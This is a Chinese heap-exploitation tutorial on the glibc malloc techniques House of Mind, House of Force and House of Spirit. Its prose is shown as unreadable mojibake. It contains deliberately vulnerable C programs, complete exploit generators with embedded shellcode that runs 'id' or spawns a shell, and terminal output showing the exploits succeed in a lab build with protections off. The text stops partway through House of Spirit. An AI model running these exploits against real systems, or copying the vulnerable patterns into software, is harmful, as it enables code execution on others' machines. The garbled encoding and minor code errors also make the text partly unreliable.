é‡è¦:
> æœ¬æ–‡å‚è€ƒ[^sploitfun]å’Œ[MallocMaleficarum](../media/attach/MallocMaleficarum.Txt),ç¼–è¯‘æ—¶å€™æ²¡æœ‰ä½¿ç”¨`ASLR`,`NX`,`RELRO`å®‰å…¨æœºåˆ¶ã€‚

è‡ª 2004 åï¼Œ`glibc malloc` GOT è·å¾—åŠ å›ºï¼Œ`unlink`æŠ€æœ¯è¢«æ·˜æ±°ã€‚ä½†æ˜¯å¾ˆå¿«åœ¨ 2005 å¹´ï¼Œ`Phantasmal Phatasmagoria` å¸¦æ¥äº†ä¸€ç³»åˆ—é’ˆå¯¹å †ä¸€å¤„åˆ©ç”¨çš„æŠ€æœ¯ã€‚

>
* The House of Primeï¼šåœ¨è°ƒç”¨å‡½æ•° malloc åï¼Œè¦æ±‚ä¸¤ä¸ªé‡Šæ”¾çš„å †å—åŒ…å«æ”»å‡»è€…å¯æ§çš„ size å­—æ®µã€‚
* The House of Mindï¼šè¦æ±‚èƒ½å¤Ÿæ“ä½œç¨‹åºåå¤åˆ†é…æ–°çš„å†…å­˜ã€‚
* The House of Forceï¼šè¦æ±‚èƒ½å¤Ÿé‡å†™ top chunkï¼Œå¹¶ä¸”å­˜åœ¨ä¸€ä¸ªå¯æ§ size çš„ malloc å‡½æ•°ï¼Œæœ€åè¿˜éœ€è¦å†è°ƒç”¨å¦ä¸€ä¸ª malloc å‡½æ•°ã€‚
* The House of Loreï¼šä¸é€‚ç”¨äºæˆ‘ä»¬çš„ä¾‹ç¨‹ã€‚
* The House of Spiritï¼šå‡è®¾æ”»å‡»è€…å¯ä»¥æ§åˆ¶ä¸€ä¸ªé‡Šæ”¾å—çš„æŒ‡é’ˆï¼Œä½†æ˜¯è¿™ä¸ªæŠ€æœ¯è¿˜ä¸èƒ½ä½¿ç”¨ã€‚

# House of Mind

åœ¨è¿™ä¸ªæŠ€æœ¯é‡Œé¢æ”»å‡»è€…æˆä½¿ç”¨è‡ªå·±æ„é€ çš„`arena`å»æˆå¼„`malloc glibc`ã€‚å‡çš„`arena` ä»¥ unsorted bin çš„ fd æ˜¯ free - 12 çš„ got å…¥å£åœ°å€ï¼Œå› æ­¤æ¼æ´ç¨‹åºåœ¨ free chunk æ—¶ `free()` çš„ got å…¥å£è¢« shellcode åœ°å€è¦†ç›–åï¼Œè¿™æ—¶ free è¢«è°ƒ pbzip2 ç”¨ shellcode å°±ä¼šè¢«æ‰§è¡Œ!

> ä¸æ˜¯æ‰€æœ‰å †æº¢å‡ºéƒ½èƒ½ç”¨è¿™ä¸ªæŠ€æœ¯ï¼Œä¸‹é¢æ˜¯èƒ½åº”ç”¨`house of mind`å…ˆå†³æ¡ä»¶:

éœ€è¦ä¸€äº›åˆ— malloc çš„è°ƒç”¨ç›´åˆ°ä¸€å—å†…å­˜çš„åœ°å€å¯¹é½åˆ° HEAP_MAX_SIZE çš„æ•´æ•°å€ï¼Œè¿™æ ·æ‰èƒ½å¾—åˆ°ä¸€å—æœ‰æ”»å‡»è€…æ§åˆ¶çš„å†…å­˜ã€‚

å‡å†’çš„`help_info` ç»“æ„ä½“åœ¨è¿™å†…å­˜åŒºåŸŸè¢«å‘ç°ã€‚ä¼ªé€ çš„`heap_info`çš„`arena`æŒ‡é’ˆ ar_ptr å°†ä¼šæŒ‡å‘ä¼ªé€ çš„`arena`.

å› æ­¤ä¼ªé€ çš„`arena`å’Œä¼ªé€ çš„`heap_info`çš„å†…å­˜åŒºåŸŸéƒ½ä¼šè¢«æ”»å‡»è€…æ§åˆ¶ã€‚

chunk çš„ size åŸŸ(å’Œå®ƒçš„ arena æŒ‡é’ˆ - prereq 1) è¢«æ”»å‡»è€…æ§åˆ¶åº”è¯¥è¢« freeã€‚

chunk ç›¸é‚»çš„ free chunk å‰é¢ä¸è¯¥æ˜¯ top chunk.

æ¼æ´ç¨‹åº: è¿™ä¸ªç¨‹åºæ»¡è¶³ä¸Šè¿°éœ€æ±‚ã€‚

```c
/* vuln.c
 House of Mind vulnerable program
 */
#include <stdio.h>
#include <stdlib.h>

int main (void) {
 char *ptr = malloc(1024); /* First allocated chunk */
 char *ptr2; /* Second chunk/Last but one chunk */
 char *ptr3; /* Last chunk */
 int heap = (int)ptr & 0xFFF00000;
 _Bool found = 0;
 int i = 2;

 for (i = 2; i < 1024; i++) {
   /* Prereq 1: Series of malloc calls until a chunk's address - when aligned to HEAP_MAX_SIZE results in 0x08100000 */
   /* 0x08100000 is the place where fake heap_info structure is found. */
   [1]if (!found && (((int)(ptr2 = malloc(1024)) & 0xFFF00000) == \
      (heap + 0x100000))) {
     printf("good heap allignment found on malloc() %i (%p)\n", i, ptr2);
     found = 1;
     break;
   }
 }
 [2]ptr3 = malloc(1024); /* Last chunk. Prereq 3: Next chunk to ptr2 != av->top */
 /* User Input. */
 [3]fread (ptr, 1024 * 1024, 1, stdin);

 [4]free(ptr2); /* Prereq 2: Freeing a chunk whose size and its arena pointer is controlled by the attacker. */
 [5]free(ptr3); /* Shell code execution. */
 return(0); /* Bye */
}
```

ä¸Šè¿°ç¨‹åºçš„å †å†…å­˜å¸ƒå±€ï¼š

![malloc-maleficarum-heap-layout-before-attack](../media/pic/heap/malloc-maleficarum-heap-layout-before-attack.png)

æ ‡å· 3 æ˜¯å‘ç”Ÿå †æº¢å‡ºçš„ä½ç½®ã€‚

ç”¨æˆ·è¾“å…¥è¢«ä¼šè¢«å­˜å‚¨åˆ° chunk1 çš„å†…å­˜æŒ‡é’ˆ å¤§å°ä¸º 1M çš„å†…å­˜ã€‚

å› æ­¤ä¸ºäº†æˆåŠŸåˆ©ç”¨å †æº¢å‡ºï¼Œæ”»å‡»è€…æé«˜å¦‚ä¸‹çš„ç”¨æˆ·è¾“å…¥(åŒºåˆ†åºåˆ—):

* å‡ arean
* å¡«å……
* å‡ heap_info
* shellcode

exp ç¨‹åº,è¿™ä¸ªç¨‹åºç”Ÿæˆæ”»å‡»è€…çš„è¾“å…¥æ•°æ®:

```c
/* exp.c
Program to generate attacker data.
Command:
     #./exp > file
*/
#include <stdio.h>

#define BIN1 0xb7fd8430

char scode[] =
/* Shellcode to execute linux command "id". Size - 72 bytes. */
"\x31\xc9\x83\xe9\xf4\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x5e"
"\xc9\x6a\x42\x83\xeb\xfc\xe2\xf4\x34\xc2\x32\xdb\x0c\xaf\x02\x6f"
"\x3d\x40\x8d\x2a\x71\xba\x02\x42\x36\xe6\x08\x2b\x30\x40\x89\x10"
"\xb6\xc5\x6a\x42\x5e\xe6\x1f\x31\x2c\xe6\x08\x2b\x30\xe6\x03\x26"
"\x5e\x9e\x39\xcb\xbf\x04\xea\x42";

char ret_str[4] = "\x00\x00\x00\x00";

void convert_endianess(int arg)
{
        int i=0;
        ret_str[3] = (arg & 0xFF000000) >> 24;
        ret_str[2] = (arg & 0x00FF0000) >> 16;
        ret_str[1] = (arg & 0x0000FF00) >> 8;
        ret_str[0] = (arg & 0x000000FF) >> 0;
}
int main() {
        int i=0,j=0;

        fwrite("\x41\x41\x41\x41", 4, 1, stdout); /* fd */
        fwrite("\x41\x41\x41\x41", 4, 1, stdout); /* bk */
        fwrite("\x41\x41\x41\x41", 4, 1, stdout); /* fd_nextsize */
        fwrite("\x41\x41\x41\x41", 4, 1, stdout); /* bk_nextsize */
        /* Fake Arena. */
        fwrite("\x00\x00\x00\x00", 4, 1, stdout); /* mutex */
        fwrite("\x01\x00\x00\x00", 4, 1, stdout); /* flag */
        for(i=0;i<10;i++)
                fwrite("\x00\x00\x00\x00", 4, 1, stdout); /* fastbinsY */
        fwrite("\xb0\x0e\x10\x08", 4, 1, stdout); /* top */
        fwrite("\x00\x00\x00\x00", 4, 1, stdout); /* last_remainder */
        for(i=0;i<127;i++) {
                convert_endianess(BIN1+(i*8));
                if(i == 119) {
                        fwrite("\x00\x00\x00\x00", 4, 1, stdout); /* preserve prev_size */
                        fwrite("\x09\x04\x00\x00", 4, 1, stdout); /* preserve size */
                } else if(i==0) {
                        fwrite("\xe8\x98\x04\x08", 4, 1, stdout); /* bins[i][0] = (GOT(free) - 12) */
                        fwrite(ret_str, 4, 1, stdout); /* bins[i][1] */
                }
                else {
                        fwrite(ret_str, 4, 1, stdout); /* bins[i][0] */
                        fwrite(ret_str, 4, 1, stdout); /* bins[i][1] */
                }
        }
        for(i=0;i<4;i++) {
                fwrite("\x00\x00\x00\x00", 4, 1, stdout); /* binmap[i] */
        }
        fwrite("\x00\x84\xfd\xb7", 4, 1, stdout); /* next */
        fwrite("\x00\x00\x00\x00", 4, 1, stdout); /* next_free */
        fwrite("\x00\x60\x0c\x00", 4, 1, stdout); /* system_mem */
        fwrite("\x00\x60\x0c\x00", 4, 1, stdout); /* max_system_mem */
        for(i=0;i<234;i++) {
                fwrite("\x41\x41\x41\x41", 4, 1, stdout); /* PAD */
        }
        for(i=0;i<722;i++) {
                if(i==721) {
                        /* Chunk 724 contains the shellcode. */
                        fwrite("\xeb\x18\x00\x00", 4, 1, stdout); /* prev_size  - Jmp 24 bytes */
                        fwrite("\x0d\x04\x00\x00", 4, 1, stdout); /* size */
                        fwrite("\x00\x00\x00\x00", 4, 1, stdout); /* fd */
                        fwrite("\x00\x00\x00\x00", 4, 1, stdout); /* bk */
                        fwrite("\x00\x00\x00\x00", 4, 1, stdout); /* fd_nextsize */
                        fwrite("\x00\x00\x00\x00", 4, 1, stdout); /* bk_nextsize */
                        fwrite("\x90\x90\x90\x90\x90\x90\x90\x90" \
                        "\x90\x90\x90\x90\x90\x90\x90\x90", 16, 1, stdout);  /* NOPS */
                        fwrite(scode, sizeof(scode)-1, 1, stdout); /* SHELLCODE */
                        for(j=0;j<230;j++)
                                fwrite("\x42\x42\x42\x42", 4, 1, stdout); /* PAD */
                        continue;
                } else {
                        fwrite("\x00\x00\x00\x00", 4, 1, stdout); /* prev_size */
                        fwrite("\x09\x04\x00\x00", 4, 1, stdout); /* size */
                }
                if(i==720) {
                        for(j=0;j<90;j++)
                                fwrite("\x42\x42\x42\x42", 4, 1, stdout); /* PAD */
                        fwrite("\x18\xa0\x04\x08", 4, 1, stdout); /* Arena Pointer */
                        for(j=0;j<165;j++)
                                fwrite("\x42\x42\x42\x42", 4, 1, stdout); /* PAD */
                } else {
                        for(j=0;j<256;j++)
                                fwrite("\x42\x42\x42\x42", 4, 1, stdout); /* PAD */
                }
        }
        return 0;
}
```

ä½¿ç”¨æ„é€ çš„æ•°æ®è¾“å…¥åçš„æ¼æ´ç¨‹åºå †ç©ºé—´ï¼š

![malloc-maleficarum-heap-layout-after-attack](../media/pic/heap/malloc-maleficarum-heap-layout-after-attack.png)

éšç€æ”»å‡»è€…ç”Ÿæˆçš„æ•°æ®è¢«è¾“å…¥ï¼Œå½“æ ‡å· 4 è¢«æ‰§è¡Œæ—¶ glibc malloc åšäº†å¦‚ä¸‹çš„ï¼š

* é€šè¿‡è°ƒç”¨ arena_for_chunk å®æ¥æ¢å¤æ­£åœ¨é‡Šæ”¾çš„ chunk çš„ arenaã€‚

1. `arena_for_chunk`ï¼š å¦‚æœ NON_MAIN_ARENA (N) bit æ²¡æœ‰è¢«ç½®ä½ï¼Œä¼šè¿”å› main arenaï¼Œå¦‚æœè®¾ç½®äº†ï¼Œåˆ™é€šè¿‡å°†å—åœ°å€ä¸ HEAP_MAX_SIZE çš„å€æ•°å¯¹é½æ¥è®¿é—®å¯¹åº”çš„ heap_info ç»“æ„ã€‚

ç„¶åè¿”å›è·å¾—çš„ heap_info ç»“æ„ä½“çš„ arena æŒ‡é’ˆã€‚

åœ¨æˆ‘ä»¬çš„ä¾‹å­é‡Œé¢ï¼ŒNON_MIAN_ARENA ä½è¢«æ”»å‡»è€…è®¾ç½®ï¼Œå› æ­¤è·å¾—è¢«é‡Šæ”¾çš„ chunk çš„ heap_info ç»“æ„ä½“ã€‚

æ”»å‡»è€…ä¹Ÿå°†ä»¥è¿™æ ·çš„æ–¹å¼è¦†å†™ï¼ˆè·å¾—çš„ heap_info ç»“æ„çš„ï¼‰arena æŒ‡é’ˆï¼Œå³å®ƒæŒ‡å‘ fake arenaï¼Œå³ heap_info çš„ ar_ptr = fake arena çš„åŸºåœ°å€ï¼ˆå³ 0x0804a018ï¼‰ã€‚

ä½¿ç”¨ arena æŒ‡é’ˆå’Œ chunk åœ°å€ä½œä¸ºå‚æ•°è°ƒç”¨_int_free. åœ¨ä¾‹å­ä¸­ï¼Œarena æŒ‡é’ˆæŒ‡å‘ä¼ªé€ çš„ arena,å› æ­¤å‡ arena å’Œ chunk åœ°å€ä½œä¸ºå‚æ•°ä¼ é€’ç»™_int_freeã€‚

å‡ arena çš„æ„é€ ï¼šä»¥ä¸‹æ˜¯éœ€è¦è¢«æ”»å‡»è€…è¦†å†™çš„å‡ arena çš„å¿…å¡«å­—æ®µï¼š

mutex - åº”è¯¥æ˜¯æ— é”çŠ¶æ€
bins - unsorted bin çš„ fd åº”è¯¥åŒ…å« free - 12 çš„ got çš„åœ°å€ 

é¡¶éƒ¨åœ°å€ä¸åº”è¯¥ç­‰äºè¢« free çš„ chunk åœ°å€ã€‚

é¡¶éƒ¨åœ°å€åº”è¯¥å¤§äº next chunk çš„åœ°å€ã€‚

ç³»ç»Ÿå†…å­˜ - å†…å­˜åº”è¯¥å¤§äº next chunk çš„ sizeã€‚

> _int_free():

* å¦‚æœ chunk æ²¡æœ‰æ˜ å°„ï¼Œåˆ™è·å¾—é”ï¼Œåœ¨æˆ‘ä»¬çš„ä¾‹å­é‡Œé¢ chunk æ²¡æœ‰è¢«æ˜ å°„æ‰€ä»¥å‡çš„ arena äº’æ–¥é”è·å–æˆåŠŸã€‚

1. åˆå¹¶:

å¦‚æœå‘ç°å‰é¢çš„ chunk æ˜¯ free çš„ï¼Œåˆ™åƒååˆå¹¶;åé¢çš„ chunk æ˜¯ free çš„ï¼Œåˆ™å‘å‰åˆå¹¶ã€‚åœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­å‰é¢çš„ chunk æ˜¯è¢«åˆ†é…çš„å‡ºå»çš„ï¼Œæ‰€ä»¥ä¸èƒ½è¢«å‘ååˆå¹¶ï¼›åé¢çš„ chunk çŠ¶æ€ä¹Ÿæ˜¯ allocated å› æ­¤ä¸èƒ½è¢«å‘å‰åˆå¹¶ã€‚

* å½“å‰çš„ free chunk åœ¨ unsorted bin.

åœ¨æˆ‘ä»¬çš„æ¡ˆä¾‹ä¸­ï¼Œfake arena çš„ unsorted bin çš„ fd åŒ…å« free çš„ GOT çš„åœ°å€ - 12ï¼Œå®ƒè¢«å¤åˆ¶åˆ°'fwd'ã€‚

ä¹‹åï¼Œå½“å‰è¢«é‡Šæ”¾çš„ chunk çš„åœ°å€è¢«å¤åˆ¶åˆ°`fwd->bk`.

bk æ˜¯ä½äº malloc_chunk åç§» 12 çš„åœ°æ–¹ï¼Œå› æ­¤ 12 è¢«åŠ åˆ°è¿™ä¸ª fwd çš„å€¼ä¸Šä¹Ÿå°±æ˜¯è¯´ free-12+12

å› æ­¤ç°åœ¨ free çš„ got å…¥å£åœ°å€è¢«ä¿®æ”¹æˆåŒ…å«å½“å‰çš„ free çŠ¶æ€çš„ chunk çš„åœ°å€ã€‚

è‡ªæ”»å‡»è€…æ”¾ç½®ä»–çš„ shellcode åœ¨å½“å‰ free çŠ¶æ€çš„ chunkï¼Œç„¶åä¸ä¹… free è¢«è°ƒç”¨æ—¶å€™æ”»å‡»è€…çš„ shellcode è¢«æ‰§è¡Œã€‚

æ”»å‡»è€…ä»¥æ„é€ çš„æ•°æ®åšè¾“å…¥æ‰§è¡Œå­˜åœ¨çš„æ¼æ´çš„ç¨‹åº shellcode è¢«æ‰§è¡Œå¦‚ä¸‹ï¼š

```shell
Sn0rt@warzone:~$ gcc -g -z norelro -z execstack -o vuln vuln.c -Wl,--rpath=~/workspace/glibc/glibc-inst2.20/lib -Wl,--dynamic-linker=~/workspace/glibc/glibc-inst2.20/lib/ld-linux.so.2
Sn0rt@warzone:~$ gcc -g -o exp exp.c
Sn0rt@warzone:~$ ./exp > file
Sn0rt@warzone:~$ ./vuln < file
ptr found at 0x804a008
good heap allignment found on malloc() 724 (0x81002a0)
uid=1000(sploitfun) gid=1000(sploitfun) groups=1000(sploitfun),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
```

ä¿æŠ¤ï¼š å¦‚ä»Šï¼Œhouse of mind æŠ€æœ¯è‡ª`glibc malloc` GOT åŠ å›ºåè€Œå¤±æ•ˆã€‚

ä¸‹é¢æ˜¯ glibc ä¸ºä¿æŠ¤ house-of-mind åˆ©ç”¨å †æº¢å‡ºå¢åŠ çš„æ£€æŸ¥ï¼š

è¢«ç ´åçš„ chunkï¼šå¦‚æœ`glibc malloc`æ²¡æœ‰æŠ›å‡º chunk è¢«ç ´åè¿™æ ·çš„é”™è¯¯ï¼Œé‚£ä¹ˆ unsotred bin çš„ç¬¬ä¸€ä¸ª chunk çš„ bk æŒ‡é’ˆåº”è¯¥æŒ‡å‘ unsorted bin.

```c
      if (__glibc_unlikely (fwd->bk != bck))
        {
          errstr = "free(): corrupted unsorted chunks";
          goto errout;
        }
```

# House of Force

åœ¨è¿™ç§æŠ€æœ¯ä¸­ï¼Œæ”»å‡»è€…æ»¥ç”¨ top chunk size æ¥æˆå¼„ 'glibc malloc' ä½¿ç”¨ top chunk å¤„ç†éå¸¸å¤§çš„å†…å­˜è¯·æ±‚(å¤§äºå †ç³»ç»Ÿå†…å­˜å¤§å°)ã€‚

ç°åœ¨å½“ä¸€ä¸ªæ–°çš„ malloc è¯·æ±‚å‚æ•°ï¼Œfree çš„ GOT æ¡ç›®å°†è¢«è¦†å†™ä¸º shellcode åœ°å€ã€‚

å› æ­¤è‡ªç°åœ¨èµ·æ— è®ºä½•æ—¶ free() è¢«è°ƒç”¨ï¼Œshellcode å°†ä¼šè¢«æ‰§è¡Œã€‚

å…ˆå†³æ¡ä»¶ï¼šæˆåŠŸåº”ç”¨ house of force éœ€è¦ä¸‰ä¸ª malloc è°ƒç”¨å¦‚ä¸‹ï¼š

* Malloc 1: æ”»å‡»è€…åº”è¯¥å¯ä»¥æ§åˆ¶ top chunk çš„ sizeï¼Œå› æ­¤ï¼Œå †æº¢å‡ºåº”è¯¥å¯èƒ½åœ¨ç‰©ç†ä¸Šä½äº top chunk ä¹‹å‰çš„è¿™ä¸ªåˆ†é…çš„å—ä¸Šã€‚
* Malloc 2: æ”»å‡»è€…åº”è¯¥èƒ½å¤Ÿæ§åˆ¶è¿™ä¸ª malloc è¯·æ±‚çš„å¤§å°ã€‚
* Malloc 3: ç”¨æˆ·è¾“å…¥åº”å¤åˆ¶åˆ°è¿™ä¸ªåˆ†é…çš„ chunkã€‚

æ¼æ´ç¨‹åº: æ­¤ç¨‹åºæ»¡è¶³ä¸Šè¿°å…ˆå†³æ¡ä»¶.

```c
/*
House of force vulnerable program. 
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h> 

int main(int argc, char *argv[])
{
        char *buf1, *buf2, *buf3;
        if (argc != 4) {
                printf("Usage Error\n");
                return;
        }
        [1]buf1 = malloc(256);
        [2]strcpy(buf1, argv[1]); /* Prereq 1 */
        [3]buf2 = malloc(strtoul(argv[2], NULL, 16)); /* Prereq 2 */
        [4]buf3 = malloc(256); /* Prereq 3 */
        [5]strcpy(buf3, argv[3]); /* Prereq 3 */

        [6]free(buf3);
        free(buf2);
        free(buf1);
        return 0;
}
```

ä¸Šè¿°æ¼æ´ç¨‹åºçš„ heap å†…å­˜å›¾ç¤ºï¼š

![house-of-force-before-attack.png](../media/pic/heap/house-of-force-before-attack.png)

æ¼æ´ç¨‹åºçš„ line[2] æ—¶å‘ç”Ÿå †æº¢å‡ºçš„åœ°æ–¹ï¼Œå› æ­¤æƒ³è¦æˆåŠŸåˆ©ç”¨å †æº¢å‡ºï¼Œæ”»å‡»è€…éœ€è¦æä¾›å¦‚ä¸‹ååˆ©è¡Œå‚æ•°:

argv[1] â€“ shellcode + å¡«å…… + top chunk çš„ size è¢«å¤åˆ¶åˆ°é¦–ä¸ª malloc chunkã€‚
argv[2] â€“ size å‚æ•°åˆ°ç¬¬äºŒä¸ª malloc chunkã€‚
argv[3] â€“ ç”¨æˆ·è¾“å…¥è¢«å¤åˆ¶åˆ°ç¬¬ä¸‰ä¸ª malloc chunkã€‚


## exploit

åˆ©ç”¨ç¨‹åºï¼š

exploit program:

```c
/* Program to exploit executable 'vuln' using hof technique.
 */
#include <stdio.h>
#include <unistd.h>
#include <string.h>

#define VULNERABLE "./vuln"
#define FREE_ADDRESS 0x08049858-0x8
#define MALLOC_SIZE "0xFFFFF744"
#define BUF3_USER_INP "\x08\xa0\x04\x08"
                
/* Spawn a shell. Size - 25 bytes. */
char scode[] =
        "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
        
int main( void )
{       
        int i;
        char * p;
        char argv1[ 265 ];
        char * argv[] = { VULNERABLE, argv1, MALLOC_SIZE, BUF3_USER_INP, NULL };
        
        strcpy(argv1,scode);
        for(i=25;i<260;i++)
                argv1[i] = 'A';
        
        strcpy(argv1+260,"\xFF\xFF\xFF\xFF"); /* Top chunk size */
        argv[264] = ''; /* Terminating NULL character */ 

        /* Execution of the vulnerable program */
        execve( argv[0], argv, NULL );
        return( -1 );
}
```

ä¸€æ—¦æ”»å‡»è€…çš„å‘½ä»¤è¡Œå‚æ•°è¢«å¤åˆ¶åˆ°å †ä¸­åçš„æ¼æ´ç¨‹åºçš„å †å†…å­˜å¸ƒå±€ï¼š

![house-of-force-before-attack](../media/pic/heap/house-of-force-before-attack.png)

ä¼´éšç€æ”»å‡»è€…å‚æ•°å‘ç”Ÿå¦‚ä¸‹ï¼š

æ ‡å· 2 è¦†å†™ top chunk çš„ size:

> æ”»å‡»è€…å‚æ•°(argv[1] - shellcode + pad + 0xFFFFFFFF)è¢«å¤åˆ¶åˆ° buf1 çš„å †ï¼Œä½†æ˜¯å‚æ•° argv[1] å¤§äº 256ï¼Œæ‰€ä»¥ top chunk çš„ size ä¼šè¢«è¦†å†™ä¸º 0xFFFFFFFFã€‚

æ ‡å· 3 ä½¿ç”¨ top chunk åˆ†é…éå¸¸å¤§çš„å—ï¼š

> éå¸¸å¤§çš„å—åˆ†é…è¯·æ±‚çš„ç›®çš„æ˜¯åœ¨åˆ†é…ä¹‹åä½¿æ–°çš„ top chunk åº”è¯¥ä½äº free çš„ GOT æ¡ç›®ä¹‹å‰ 8 ä¸ªå­—èŠ‚ã€‚

æ‰€ä»¥å¤šä¸ª malloc çš„è¯·æ±‚(æ ‡å· 4)å°†ä¼šå¸®åŠ©æˆ‘ä¹ˆè¦†å†™ free çš„ got æ¡ç›®ã€‚

æ”»å‡»è€…å‚æ•°ï¼ˆargv [2] - 0xFFFFF744ï¼‰ä½œä¸º size å‚æ•°ä¼ é€’ç»™ç¬¬äºŒä¸ª malloc è°ƒç”¨ï¼ˆæ ‡å·[3]ï¼‰ã€‚

è¿™ä¸ª size å‚æ•°é€šè¿‡ä¸‹é¢å…¬å¼è®¡ç®—çš„ï¼š

 size = ((free-8)-top)

ä½ç½®

> free æ˜¯ "vlun ä¸­ free çš„ GOT çš„æ¡ç›®" ä¹Ÿå°±æ˜¯è¯´ free = 0x08049858.

> top æ˜¯ "å½“å‰çš„ top chunk (æ ‡å· 1 åçš„ç¬¬ä¸€ä¸ª malloc)"ä¹Ÿå°±æ˜¯è¯´ top = 0x0804a108.

å› æ­¤ size = ((0x8049858-0x8)-0x804a108) = -8B8 = 0xFFFFF748

å½“  size = 0xFFFFF748 æ˜¯æˆ‘ä»¬æ”¾ç½®æ–° top chunk free çš„ GOT æ¡ç›®ä¹‹å‰çš„ 8 bytes çš„å®ç°æ–¹å¼å±•ç¤ºå¦‚ä¸‹ï¼š

> (0xFFFFF748+0x804a108) = 0x08049850 = (0x08049858-0x8)

ä½†æ˜¯å½“æ”»å‡»è€…é€šè¿‡ä¸€ä¸ª size å‚æ•° 0xFFFFF748ï¼Œglibc malloc æ¢è£…è¿™ size å˜æˆå¯ç”¨çš„ size 0xFFFFF750ï¼Œæ‰€ä»¥ç°åœ¨æ–°çš„ top chunk çš„ size ä¼šä½äº 0x8049858 è€Œä¸æ˜¯ 0x8049850.

æ‰€ä»¥ä½œä¸º 0xFFFFF748 çš„æ›¿ä»£ï¼Œæ”»å‡»è€…åº”è¯¥é€šè¿‡ 0xFFFFF74 ä¸º size å‚æ•°ï¼Œè¿™æ ·å®ƒä¼šè¢«è½¬åŒ–ä¸ºä¸€ä¸ªå¦‚æˆ‘ä»¬æ‰€éœ€è¦å†…éƒ¨å¯ç”¨çš„ size 0xFFFFF748ã€‚

åœ¨æ ‡å· 4:

> ç°åœ¨è‡ªæ ‡å· [3] top chunk æŒ‡å‘ 0x8049850ï¼Œä¸€ä¸ª 256 å­—èŠ‚çš„å†…å­˜åˆ†é…çš„è¯·æ±‚å°†ä¼šä½¿ glibc malloc è¿”å› 0x8049858 è¢«å¤åˆ¶åˆ° buf3.

åœ¨æ ‡å·[5]:

> å¤åˆ¶ buf1 çš„åœ°å€åˆ° buf3ï¼Œå¯¼è‡´ GOT è¢«è¦†ç›–ï¼Œæ‰€ä»¥åœ¨ line[6]æ‰ç”¨ free ä¼šå¯¼è‡´ä»»æ„ shellcode æ‰§è¡Œï¼

ç”¨æ”»å‡»è€…å‘½ä»¤è¡Œå‚æ•°æ­£åœ¨çš„æ‰§è¡Œçš„æ¼æ´ç¨‹åºæ‰§è¡Œ shellcode å¦‚ä¸‹æ‰€ç¤ºï¼š

```shell
Sn0rt@warzone:~$ gcc -g -z norelro -z execstack -o vuln vuln.c -Wl,--rpath=/home/sploitfun/glibc/glibc-inst2.20/lib -Wl,--dynamic-linker=/home/sploitfun/glibc/glibc-inst2.20/lib/ld-linux.so.2
Sn0rt@warzone:~$ gcc -g -o exp exp.c
Sn0rt@warzone:~$ ./exp 
$ ls
cmd  exp  exp.c  vuln  vuln.c
$ exit
```

ä¿æŠ¤: ç›´åˆ°ç›®å‰ï¼Œè¿˜æ²¡æœ‰å¢åŠ è¿™ä¸ªæŠ€æœ¯çš„ä¿æŠ¤æŠ€æœ¯ï¼Œä¹Ÿå°±è¯´è¿™ä¸ªæŠ€æœ¯å¯ä»¥å¸®åŠ©æˆ‘ä»¬åœ¨æœ€æ–°ç‰ˆæœ¬çš„ glibc ä¸Šåˆ©ç”¨å †æº¢å‡ºã€‚ğŸ™‚

# House of Spirit

è¿™ä¸ªæŠ€æœ¯ï¼Œæ”»å‡»è€…æˆå¼„ glibc malloc è¿”å›çš„ chunk çš„åœ°å€ä½äº stack æ®µï¼Œè€Œä¸æ˜¯å †æ®µã€‚è¿™æ ·å°±å…è®¸æ”»å‡»è€…è¦†ç›–å­˜å‚¨åœ¨æ ˆä¸Šçš„è¿”å›åœ°å€ã€‚

å…ˆå†³æ¡ä»¶ï¼šä¸æ˜¯æ‰€æœ‰å †æº¢å‡ºéƒ½èƒ½é€‚ç”¨ house of spirit,ä¸‹é¢æ˜¯èƒ½æˆåŠŸåº”ç”¨å®ƒçš„å…ˆå†³æ¡ä»¶ã€‚

* ä¸€ä¸ªç¼“å†²åŒºæº¢å‡ºè¦†ç›–ä¸€ä¸ªåŒ…å« malloc è¿”å›çš„ chunk åœ°å€çš„å˜é‡ã€‚
* ä¸Šè¿° chunk åº”è¯¥æ˜¯ free çŠ¶æ€ï¼Œæ”»å‡»è€…åº”è¯¥å¯ä»¥æ§åˆ¶è¿™ä¸ª chunk çš„ size å­—æ®µï¼Œå¹¶æŠŠå®ƒæ”¹æˆç­‰äºä¸‹ä¸€ä¸ªåˆ†é…çš„ chunk çš„ size å€¼ã€‚
* Malloc ä¸€ä¸ª chunkã€‚
* ç”¨æˆ·è¾“å…¥å¯ä»¥è¢«å¤åˆ¶åˆ°ä¸Šè¿°çš„ malloc çš„ chunkã€‚

æ¼æ´ç¨‹åºï¼šè¿™ä¸ªç¨‹åºçœ‹ä¸Šå»æ»¡è¶³ä¸Šè¿°éœ€æ±‚ã€‚

```c
/* vuln.c
House of Spirit vulnerable program
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void fvuln(char *str1, int age)
{
   char *ptr1, name[44];
   int local_age;
   char *ptr2;
   [1]local_age = age; /* Prereq 2 */

   [2]ptr1 = (char *) malloc(256);
   printf("\nPTR1 = [ %p ]", ptr1);
   [3]strcpy(name, str1); /* Prereq 1 */
   printf("\nPTR1 = [ %p ]\n", ptr1);
   [4]free(ptr1); /* Prereq 2 */

   [5]ptr2 = (char *) malloc(40); /* Prereq 3 */
   [6]snprintf(ptr2, 40-1, "%s is %d years old", name, local_age); /* Prereq 4 */
   printf("\n%s\n", ptr2);
}

int main(int argc, char *argv[])
{
   int i=0;
   int stud_class[10];  /* Required since nextchunk size should lie in between 8 and arena's system_mem. */
   for(i=0;i<10;i++)
        [7]stud_class[i] = 10;
   if (argc == 3)
      fvuln(argv[1], 25);
   return 0;
}
```
ä¸Šè¿°æ¼æ´ç¨‹åºçš„æ ˆå¸ƒå±€

![house-of-spirit](../media/pic/heap/house-of-spirit-before-attack.png)

æ¼æ´ç¨‹åºçš„æ ‡å·[3]å¤„å‘ç”Ÿäº†ç¼“å†²åŒºæº¢å‡ºï¼Œå› æ­¤ä¸ºäº†æˆåŠŸåˆ©ç”¨æ¼æ´ç¨‹åºï¼Œæ”»å‡»è€…éœ€è¦ç»™å‡ºä»¥ä¸‹çš„å‘½ä»¤è¡Œå‚æ•°ï¼š

argv[1] = Shell Code + Stack Address + Chunk size

